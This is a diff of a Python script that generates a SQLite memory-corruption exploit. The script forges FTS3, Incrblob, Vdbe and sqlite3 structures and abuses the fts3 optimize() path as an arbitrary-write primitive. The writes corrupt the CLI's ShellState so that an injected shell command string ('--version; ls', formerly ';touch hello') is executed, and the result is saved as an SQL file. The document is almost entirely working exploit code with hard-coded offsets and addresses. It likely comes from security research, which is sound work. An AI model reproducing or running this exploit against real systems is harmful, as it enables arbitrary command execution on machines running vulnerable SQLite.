@@ -3,197 +3,342 @@
 import os
 import sys
 
-def valToStr(value, length):
+def valToLittleEndianHex(value, length):
     b = '{num:0{width}X}'.format(num=value, width=length * 2)
     c = "".join(reversed([b[i:i+2] for i in range(0, len(b), 2)]))
-    return c     
+    return c
 
-def writeStr(exp, off, string):
+def strToLittleEndianHex(s):
+    hex_bytes = [f'{ord(c):02X}' for c in s]   # Convert each character to 2-digit hex
+    return ''.join(hex_bytes)
+
+def writeBlob(exp, off, string):
     exp = list(exp)
     string = list(string)
     for i in range(0, len(string)):
         exp[off + i] = string[i]
     return ''.join(exp)
 
-def writeVal(exp, off, value, length):
-    # value = hex(value)
-    # print(value)
-    return writeStr(exp, off * 2, valToStr(value, length))
+def writeVal(exp, off, value, length=8):
+    #print(hex(off), hex(value))
+    return writeBlob(exp, off * 2, valToLittleEndianHex(value, length))
 
-'''
-The attack needs to set p->doXdgOpen to 1 and p->zTempFile to ";touch hello"
-We leverage the arbitrary write primitive twice
-We disabled ASLR, so the address of p and faked structures are fixed
-'''
+def writeStr(exp, off, string):
+    #print(hex(off), string)
+    return writeBlob(exp, off * 2, strToLittleEndianHex(string))
 
-shellstate = 0x7fffffffc8b8
+compact = True
 
-doXdgOpen = shellstate + 0xe
-zTempFile = shellstate + 0x98
+exp = valToLittleEndianHex(0xdeadbeef, 8) + "0" * 0x800 * 2
 
-exp = "0" * 0x800 * 2
+addr_ShellState = 0x7fffffffcf68
+offset_doXdgOpen_ShellState = 0xe
+offset_zTempFile_ShellState = 0x98
 
-base = 0x666500
-fts3table_off = 0x80
-incrblob_off = 0x80 + 0x220
-vdbe_off = 0x80 + 0x220 + 0x38
-sqlite3_off = 0x80 + 0x220 + 0x38 + 0x138
-sqlite3_value_off = 0x80 + 0x220 + 0x38 + 0x138 + 0x308
-src_off = 0x80 + 0x220 + 0x38 + 0x138 + 0x308 + 0x48 + 0x10
+base = 0x667ad8
+base2 = base + 0x400
 
-fts3table_base = base + fts3table_off
-incrblob_base = base + incrblob_off
-vdbe_base = base + vdbe_off
-sqlite3_base = base + sqlite3_off
-sqlite3_value_base = base + sqlite3_value_off
-src_base = base + src_off
+#----------------------------------------------------------
+# expected layout:
 
-print("fts3table:" + hex(fts3table_base))
-print("incrblob:" + hex(incrblob_base))
-print("vdbe:" + hex(vdbe_base))
-print("sqlite3:" + hex(sqlite3_base))
-print("sqlite3_value:" + hex(sqlite3_value_base))
-print("src:" + hex(src_base))
+# Fts3Cursor (0x80)
+# Fts3Table (0x220)
+# Incrblob_metadata (0x8)
+# Incrblob (0x38)
+# sqlite3 (0x308)
+# nBytesFreed (0x4)
+# Vdbe_metadata (0x8)
+# Vdbe (0x138)
+# sqlite3_value (0x48)
+# malicious metadata (0x8)
+# malicious value/string (?)
 
+#----------------------------------------------------------
+# required type.member values:
 
-# pVtab
-exp = writeVal(exp, 0, fts3table_base, 8)
+# Fts3Cursor.base.pVtab = &Fts3Table    [0, 8)      (line 182454 @ fts3OptimizeFunc)
+# Fts3Table.pSegments = &Incrblob       [0x1e0, 8)  (line 98925 @ sqlite3_blob_close)
+# Incrblob.pStmt = &Vdbe                [0x18, 8)   (line 87440 @ sqlite3_finalize)
+# Incrblob.db = &sqlite3                [0x20, 8)   (line 98931 @ sqlite3_blob_close)
+# sqlite3.pErr = &sqlite3_value         [0x188, 8)  (line 85445 @ sqlite3VdbeReset)
+# sqlite3.pnBytesFreed = &nBytesFreed   [0x300, 8)  (line 29385 @ sqlite3DbFreeNN)
+# Vdbe.db = &sqlite3                    [0x0. 8)    (line 87441 @ sqlite3_finalize)
+# Vdbe.zErrMsg = src_ptr                [0xa8, 8)   (line 85445 @ sqlite3VdbeReset)
+# Vdbe.eVdbeState = 1                   [0xcd, 1)   (line 87445 @ sqlite3_finalize)
+# sqlite3_value.szMalloc = 0x100        [0x20, 4)   (line 80324 @ sqlite3VdbeMemClearAndResize)
+# sqlite3_value.zMalloc = dst_ptr       [0x28, 8)   (line 80328 @ sqlite3VdbeMemClearAndResize)
+# malicious_content = Your-bad-value
 
-# db
-exp = writeVal(exp, fts3table_off + 0x18, 0, 8)
+#----------------------------------------------------------
+# common sizes and offsets
 
-# pSegments
-exp = writeVal(exp, fts3table_off + 0x1e0, incrblob_base, 8)
+# sizeof types
+Fts3Cursor_size = 0x80
+Fts3Table_size = 0x220
+Incrblob_metadata_size = 0x8
+Incrblob_size = 0x38
+sqlite3_size = 0x308
+nBytesFreed_size = 0x4
+Vdbe_metadata_size = 0x8
+Vdbe_size = 0x138
+sqlite3_value_size = 0x48
+malicious_metadata_size = 0x8
 
-# pStmt
-exp = writeVal(exp, incrblob_off + 0x18, vdbe_base, 8)
+# raddr -> address relative to base
+#       -> offset relattive to exp
+raddr_Fts3Cursor = 0
+raddr_Fts3Table = raddr_Fts3Cursor + Fts3Cursor_size
+raddr_Incrblob_metadata = raddr_Fts3Table + Fts3Table_size
+raddr_Incrblob = raddr_Incrblob_metadata + Incrblob_metadata_size
+raddr_sqlite3 = raddr_Incrblob + Incrblob_size
+raddr_nBytesFreed = raddr_sqlite3 + sqlite3_size
+raddr_Vdbe_metadata = raddr_nBytesFreed + nBytesFreed_size
+raddr_Vdbe = raddr_Vdbe_metadata + Vdbe_metadata_size
+raddr_sqlite3_value = raddr_Vdbe + Vdbe_size
+raddr_malicious_metadata = raddr_sqlite3_value + sqlite3_value_size
+raddr_malicious_content = raddr_malicious_metadata + malicious_metadata_size
 
-# db in Incrblob
-exp = writeVal(exp, incrblob_off + 0x20, sqlite3_base, 8)
+# offset_type_member -> offset of member within type
 
-# db in Vdbe
-exp = writeVal(exp, vdbe_off, sqlite3_base, 8)
+if compact:
 
-# pc in Vdbe
-exp = writeVal(exp, vdbe_off + 0x80, 0, 4)
+    Fts3Cursor_size = 0x8
+    raddr_Fts3Cursor = 0
+    # put sqlite3, the largest (0x308) structure, immediately after Fts3Cursor
+    raddr_sqlite3 = raddr_Fts3Cursor + Fts3Cursor_size - 0x18 # Offset of 1st used member
+    # align Fts3Table within sqlite3
+    raddr_Fts3Table = raddr_sqlite3
+    # put Vdbe_medata + Vdbe (0x140) within sqlite3 (also within Fts3Table)
+    raddr_Vdbe_metadata = raddr_Fts3Table + 0x20
+    Vdbe_metadata_size = 0x8
+    raddr_Vdbe = raddr_Vdbe_metadata + Vdbe_metadata_size
+    # put Incrblob_metadata + Incrblob (0x40) within sqlite3 (also within Fts3Table)
+    raddr_Incrblob_metadata = raddr_sqlite3 + 0x190
+    Incrblob_metadata_size = 0x8
+    raddr_Incrblob = raddr_Incrblob_metadata + Incrblob_metadata_size
+    # put nBytesFreed (0x4) within sqlite3
+    raddr_nBytes_freed = raddr_sqlite3 + 0x1f8 
+    # put sqlite3_value (0x48) within sqlite3
+    raddr_sqlite3_value = raddr_sqlite3 + 0x1fc
+    # put malicious_metata + malicious_content (0x8 + ?) within sqlite3
+    raddr_malicious_metadata = raddr_sqlite3 + 0x1fc + 0x48
+    malicious_metadata_size = 0x8
+    raddr_malicious_content = raddr_malicious_metadata + malicious_metadata_size
 
-# mutex in sqlite3
-exp = writeVal(exp, sqlite3_off + 0x18, 0, 8)
+#----------------------------------------------------------
+# 1st malicious actions --> corrupt doXdgOpen
 
-# set nOnceFlag in Vdbe
-exp = writeVal(exp, vdbe_off + 0x110, 0, 4)
+dst_ptr = addr_ShellState + offset_doXdgOpen_ShellState
+bad_val = 0x1
 
-# set pFrame in Vdbe
-exp = writeVal(exp, vdbe_off + 0xf0, 0, 8)
+# Fts3Cursor.base.pVtab = &Fts3Table
+offset_Fts3Cursor_pVtab = 0
+raddr_Fts3Cursor_pVtab = raddr_Fts3Cursor + offset_Fts3Cursor_pVtab
+addr_Fts3Table = base + raddr_Fts3Table
+exp = writeVal(exp, raddr_Fts3Cursor_pVtab, addr_Fts3Table)
 
-# set zErrMsg in Vdbe
-exp =  writeVal(exp, vdbe_off + 0xa8, src_base, 8)
+# Fts3Table.pSegments = &Incrblob
+offset_Fts3Table_pSegments = 0x1e0
+raddr_Fts3Table_pSegments = raddr_Fts3Table + offset_Fts3Table_pSegments
+addr_Incrblob = base + raddr_Incrblob
+exp = writeVal(exp, raddr_Fts3Table_pSegments, addr_Incrblob)
 
-# set eVdbeState larger than 0x1 in Vdbe
-exp = writeVal(exp, vdbe_off + 0xcd, 0x1, 1)
+# Incrblob.db = &sqlite3
+offset_Incrblob_db = 0x20
+raddr_Incrblob_db = raddr_Incrblob + offset_Incrblob_db
+addr_sqlite3 = base + raddr_sqlite3
+exp = writeVal(exp, raddr_Incrblob_db, addr_sqlite3)
 
-# set pErr in sqlite3
-exp = writeVal(exp, sqlite3_off + 0x188, sqlite3_value_base + 0x18, 8)
+# sqlite3.pnBytesFreed = &nBytesFreed   (line 29385 @ sqlite3DbFreeNN)
+offset_sqlite3_pnBytesFreed = 0x300
+raddr_sqlite3_pnBytesFreed = raddr_sqlite3 + offset_sqlite3_pnBytesFreed
+addr_nBytesFreed = base + raddr_nBytesFreed
+exp = writeVal(exp, raddr_sqlite3_pnBytesFreed, addr_nBytesFreed)
 
-# set zMalloc in sqlite3_value
-#exp = writeVal(exp, sqlite3_value_off + 0x40, base + 0x20, 8)
-exp = writeVal(exp, sqlite3_value_off + 0x40, doXdgOpen, 8)
+# sqlite3.lookaside.pTrueEnd = 0        (line 29305 @ isqlite3DbMallocSize)
+offset_sqlite3_lookaside_pTrueEnd = 0x1f0
+raddr_lookaside_pTrueEnd = raddr_sqlite3 + offset_sqlite3_lookaside_pTrueEnd
+pTrueEnd_val = 0
+exp = writeVal(exp, raddr_lookaside_pTrueEnd, pTrueEnd_val)
 
-# set szMalloc larger than 0x20, so zMalloc will not be reset in sqlite3VdbeMemGrow
-exp = writeVal(exp, sqlite3_value_off + 0x38, 0x30, 4)
+# Incrblob.pStmt = &Vdbe                (line 87440 # sqlite3_finalize)
+offset_Incrblob_pStmt = 0x18
+raddr_Incrblob_pStmt = raddr_Incrblob + offset_Incrblob_pStmt
+addr_Vdbe = base + raddr_Vdbe
+exp = writeVal(exp, raddr_Incrblob_pStmt, addr_Vdbe)
 
-# set pnBytesFreed in sqlite3 to none zero
-exp = writeVal(exp, sqlite3_off + 0x300, base, 8)
+# Vdbe.db = &sqlite3                    (line 87441 @ sqlite3_finalize)
+offset_Vdbe_db = 0x0
+raddr_Vdbe_db = raddr_Vdbe + offset_Vdbe_db
+exp = writeVal(exp, raddr_Vdbe_db, addr_sqlite3)
 
-# set pVdbe in sqlite3 equals to Vdbe_base
-exp = writeVal(exp, sqlite3_off + 0x8, vdbe_base, 8)
+# Vdbe.eVdbeState = 1                   (line 87445 @ sqlite3_finalize)
+offset_Vdbe_eVdbeState = 0xcd
+raddr_Vdbe_eVdbeState = raddr_Vdbe + offset_Vdbe_eVdbeState
+eVdbeState_val = 1
+exp = writeVal(exp, raddr_Vdbe_eVdbeState, eVdbeState_val, 1)
 
-# add a src string to test
-exp = writeVal(exp, src_off, 0x1, 1)
+# Vdbe.zErrMsg = src_ptr                (line 85445 @ sqlite3VdbeReset)
+offset_Vdbe_zErrMsg = 0xa8
+raddr_Vdbe_zErrMsg = raddr_Vdbe + offset_Vdbe_zErrMsg
+src_ptr = base + raddr_malicious_content
+zErrMsg_val = src_ptr
+exp = writeVal(exp, raddr_Vdbe_zErrMsg, zErrMsg_val)
 
-print(exp)
+# sqlite3.pErr = &sqlite3_value         (line 85445 @ sqlite3VdbeReset)
+offset_sqlite3_pErr = 0x188
+raddr_sqlite3_pErr = raddr_sqlite3 + offset_sqlite3_pErr
+addr_sqlite3_value = base + raddr_sqlite3_value
+exp = writeVal(exp, raddr_sqlite3_pErr, addr_sqlite3_value)
 
+# sqlite3_value.szMalloc = 0x100        (line 80324 @ sqlite3VdbeMemClearAndResize)
+offset_sqlite3_value_szMalloc = 0x20
+raddr_sqlite3_value_szMalloc = raddr_sqlite3_value + offset_sqlite3_value_szMalloc
+szMalloc_val = 0x100
+exp = writeVal(exp, raddr_sqlite3_value_szMalloc, szMalloc_val, 4)
 
-exp_2 = "0" * 0x800 * 2
-base_2 = 0x6790e0
+# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
+offset_sqlite3_value_zMalloc = 0x28
+raddr_sqlite3_value_zMalloc = raddr_sqlite3_value + offset_sqlite3_value_zMalloc
+zMalloc_val = dst_ptr
+exp = writeVal(exp, raddr_sqlite3_value_zMalloc, zMalloc_val)
 
-fts3table_base_2 = base_2 + fts3table_off
-incrblob_base_2 = base_2 + incrblob_off
-vdbe_base_2 = base_2 + vdbe_off
-sqlite3_base_2 = base_2 + sqlite3_off
-sqlite3_value_base_2 = base_2 + sqlite3_value_off
-src_base_2 = base_2 + src_off
+# malicious_content = Your-bad-value
+exp = writeVal(exp, raddr_malicious_content, bad_val)
 
-# pVtab
-exp_2 = writeVal(exp_2, 0, fts3table_base_2, 8)
+# #----------------------------------------------------------
+# # 2nd malicious actions -> corrupt zTempFile
+# 
+safe_space_offset = 0x400
+raddr_Fts3Cursor = safe_space_offset
 
-# db
-exp_2 = writeVal(exp_2, fts3table_off + 0x18, 0, 8)
+# raddr -> address relative to base
+#       -> offset relattive to exp
+raddr_Fts3Table = raddr_Fts3Cursor + Fts3Cursor_size
+raddr_Incrblob_metadata = raddr_Fts3Table + Fts3Table_size
+raddr_Incrblob = raddr_Incrblob_metadata + Incrblob_metadata_size
+raddr_sqlite3 = raddr_Incrblob + Incrblob_size
+raddr_nBytesFreed = raddr_sqlite3 + sqlite3_size
+raddr_Vdbe_metadata = raddr_nBytesFreed + nBytesFreed_size
+raddr_Vdbe = raddr_Vdbe_metadata + Vdbe_metadata_size
+raddr_sqlite3_value = raddr_Vdbe + Vdbe_size
+raddr_malicious_metadata = raddr_sqlite3_value + sqlite3_value_size
+raddr_malicious_content = raddr_malicious_metadata + malicious_metadata_size
 
-# pSegments
-exp_2 = writeVal(exp_2, fts3table_off + 0x1e0, incrblob_base_2, 8)
+# offset_type_member -> offset of member within type
 
-# pStmt
-exp_2 = writeVal(exp_2, incrblob_off + 0x18, vdbe_base_2, 8)
+if compact:
 
-# db in Incrblob
-exp_2 = writeVal(exp_2, incrblob_off + 0x20, sqlite3_base_2, 8)
+    Fts3Cursor_size = 0x8
+    # put sqlite3, the largest (0x308) structure, immediately after Fts3Cursor
+    raddr_sqlite3 = raddr_Fts3Cursor + Fts3Cursor_size - 0x18 # Offset of 1st used member
+    # align Fts3Table within sqlite3
+    raddr_Fts3Table = raddr_sqlite3
+    # put Vdbe_medata + Vdbe (0x140) within sqlite3 (also within Fts3Table)
+    raddr_Vdbe_metadata = raddr_Fts3Table + 0x20
+    Vdbe_metadata_size = 0x8
+    raddr_Vdbe = raddr_Vdbe_metadata + Vdbe_metadata_size
+    # put Incrblob_metadata + Incrblob (0x40) within sqlite3 (also within Fts3Table)
+    raddr_Incrblob_metadata = raddr_sqlite3 + 0x190
+    Incrblob_metadata_size = 0x8
+    raddr_Incrblob = raddr_Incrblob_metadata + Incrblob_metadata_size
+    # put nBytesFreed (0x4) within sqlite3
+    raddr_nBytes_freed = raddr_sqlite3 + 0x1f8 
+    # put sqlite3_value (0x48) within sqlite3
+    raddr_sqlite3_value = raddr_sqlite3 + 0x1fc
+    # put malicious_metata + malicious_content (0x8 + ?) within sqlite3
+    raddr_malicious_metadata = raddr_sqlite3 + 0x1fc + 0x48
+    malicious_metadata_size = 0x8
+    raddr_malicious_content = raddr_malicious_metadata + malicious_metadata_size
 
-# db in Vdbe
-exp_2 = writeVal(exp_2, vdbe_off, sqlite3_base_2, 8)
+dst_ptr = addr_ShellState + offset_zTempFile_ShellState
 
-# pc in Vdbe
-exp_2 = writeVal(exp_2, vdbe_off + 0x80, 0, 4)
+# Fts3Cursor.base.pVtab = &Fts3Table
+offset_Fts3Cursor_pVtab = 0
+raddr_Fts3Cursor_pVtab = raddr_Fts3Cursor + offset_Fts3Cursor_pVtab
+addr_Fts3Table = base + raddr_Fts3Table
+exp = writeVal(exp, raddr_Fts3Cursor_pVtab, addr_Fts3Table)
 
-# mutex in sqlite3
-exp_2 = writeVal(exp_2, sqlite3_off + 0x18, 0, 8)
+# Fts3Table.pSegments = &Incrblob
+offset_Fts3Table_pSegments = 0x1e0
+raddr_Fts3Table_pSegments = raddr_Fts3Table + offset_Fts3Table_pSegments
+addr_Incrblob = base + raddr_Incrblob
+exp = writeVal(exp, raddr_Fts3Table_pSegments, addr_Incrblob)
 
-# set nOnceFlag in Vdbe
-exp_2 = writeVal(exp_2, vdbe_off + 0x110, 0, 4)
+# Incrblob.db = &sqlite3
+offset_Incrblob_db = 0x20
+raddr_Incrblob_db = raddr_Incrblob + offset_Incrblob_db
+addr_sqlite3 = base + raddr_sqlite3
+exp = writeVal(exp, raddr_Incrblob_db, addr_sqlite3)
 
-# set pFrame in Vdbe
-exp_2 = writeVal(exp_2, vdbe_off + 0xf0, 0, 8)
+# sqlite3.pnBytesFreed = &nBytesFreed   (line 29385 @ sqlite3DbFreeNN)
+offset_sqlite3_pnBytesFreed = 0x300
+raddr_sqlite3_pnBytesFreed = raddr_sqlite3 + offset_sqlite3_pnBytesFreed
+addr_nBytesFreed = base + raddr_nBytesFreed
+exp = writeVal(exp, raddr_sqlite3_pnBytesFreed, addr_nBytesFreed)
 
-# set zErrMsg in Vdbe
-exp_2 =  writeVal(exp_2, vdbe_off + 0xa8, src_base_2, 8)
+# sqlite3.lookaside.pTrueEnd = 0        (line 29305 @ isqlite3DbMallocSize)
+offset_sqlite3_lookaside_pTrueEnd = 0x1f0
+raddr_lookaside_pTrueEnd = raddr_sqlite3 + offset_sqlite3_lookaside_pTrueEnd
+pTrueEnd_val = 0
+exp = writeVal(exp, raddr_lookaside_pTrueEnd, pTrueEnd_val)
 
-# set eVdbeState larger than 0x1 in Vdbe
-exp_2 = writeVal(exp_2, vdbe_off + 0xcd, 0x1, 1)
+# Incrblob.pStmt = &Vdbe                (line 87440 # sqlite3_finalize)
+offset_Incrblob_pStmt = 0x18
+raddr_Incrblob_pStmt = raddr_Incrblob + offset_Incrblob_pStmt
+addr_Vdbe = base + raddr_Vdbe
+exp = writeVal(exp, raddr_Incrblob_pStmt, addr_Vdbe)
 
-# set pErr in sqlite3
-exp_2 = writeVal(exp_2, sqlite3_off + 0x188, sqlite3_value_base_2 + 0x18, 8)
+# Vdbe.db = &sqlite3                    (line 87441 @ sqlite3_finalize)
+offset_Vdbe_db = 0x0
+raddr_Vdbe_db = raddr_Vdbe + offset_Vdbe_db
+exp = writeVal(exp, raddr_Vdbe_db, addr_sqlite3)
 
-# set zMalloc in sqlite3_value
-exp_2 = writeVal(exp_2, sqlite3_value_off + 0x40, zTempFile, 8)
+# Vdbe.eVdbeState = 1                   (line 87445 @ sqlite3_finalize)
+offset_Vdbe_eVdbeState = 0xcd
+raddr_Vdbe_eVdbeState = raddr_Vdbe + offset_Vdbe_eVdbeState
+eVdbeState_val = 1
+exp = writeVal(exp, raddr_Vdbe_eVdbeState, eVdbeState_val, 1)
 
-# set szMalloc larger than 0x20, so zMalloc will not be reset in sqlite3VdbeMemGrow
-exp_2 = writeVal(exp_2, sqlite3_value_off + 0x38, 0x30, 4)
+# Vdbe.zErrMsg = src_ptr                (line 85445 @ sqlite3VdbeReset)
+offset_Vdbe_zErrMsg = 0xa8
+raddr_Vdbe_zErrMsg = raddr_Vdbe + offset_Vdbe_zErrMsg
+src_ptr = base + raddr_malicious_content
+zErrMsg_val = src_ptr
+exp = writeVal(exp, raddr_Vdbe_zErrMsg, zErrMsg_val)
 
-# set pnBytesFreed in sqlite3 to none zero
-exp_2 = writeVal(exp_2, sqlite3_off + 0x300, base_2, 8)
+# sqlite3.pErr = &sqlite3_value         (line 85445 @ sqlite3VdbeReset)
+offset_sqlite3_pErr = 0x188
+raddr_sqlite3_pErr = raddr_sqlite3 + offset_sqlite3_pErr
+addr_sqlite3_value = base + raddr_sqlite3_value
+exp = writeVal(exp, raddr_sqlite3_pErr, addr_sqlite3_value)
 
-# set pVdbe in sqlite3 equals to Vdbe_base
-exp_2 = writeVal(exp_2, sqlite3_off + 0x8, vdbe_base_2, 8)
+# sqlite3_value.szMalloc = 0x100        (line 80324 @ sqlite3VdbeMemClearAndResize)
+offset_sqlite3_value_szMalloc = 0x20
+raddr_sqlite3_value_szMalloc = raddr_sqlite3_value + offset_sqlite3_value_szMalloc
+szMalloc_val = 0x100
+exp = writeVal(exp, raddr_sqlite3_value_szMalloc, szMalloc_val, 4)
 
-# add a src string ptr to test
-exp_2 = writeVal(exp_2, src_off, src_base_2 + 0x8, 8)
+# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
+offset_sqlite3_value_zMalloc = 0x28
+raddr_sqlite3_value_zMalloc = raddr_sqlite3_value + offset_sqlite3_value_zMalloc
+zMalloc_val = dst_ptr
+exp = writeVal(exp, raddr_sqlite3_value_zMalloc, zMalloc_val)
 
-# add a src string ";touch hello"
-exp_2 = writeVal(exp_2, src_off + 0x8, 0x6f6c6c6568206863756f743b, 13)
-
-print(exp_2)
-
+# put "/bin/bash" after malicious content
+raddr_string = raddr_malicious_content + 0x10
+exp = writeStr(exp, raddr_string, "--version; ls")
+ 
+# malicious_content = Your-bad-value
+exp = writeVal(exp, raddr_malicious_content, base + raddr_string)
 
 with open('/tmp/exp', 'w') as f:
     f.write("create table t1(c1 char);\n")
     f.write("insert into t1 values(x'" + exp + "');\n")
     f.write("create virtual table a using fts3(b);\n")
-    f.write("insert into a values(x'" + valToStr(base, 8) + "');\n")
-    f.write("select hex(a) from a;\n")
+    f.write("insert into a values(x'" + valToLittleEndianHex(base, 8) + "');\n")
     f.write("select optimize(b) from a;\n")
     f.write("delete from a;\n")
-
-    f.write("insert into t1 values(x'" + exp_2 + "');\n")
-    f.write("insert into a values(x'" + valToStr(base_2, 8) + "');\n")
+    f.write("insert into a values(x'" + valToLittleEndianHex(base + safe_space_offset, 8) + "');\n")
     f.write("select optimize(b) from a;\n")
-    f.write(".exit")
+    f.write("select sqlite_version();\n")
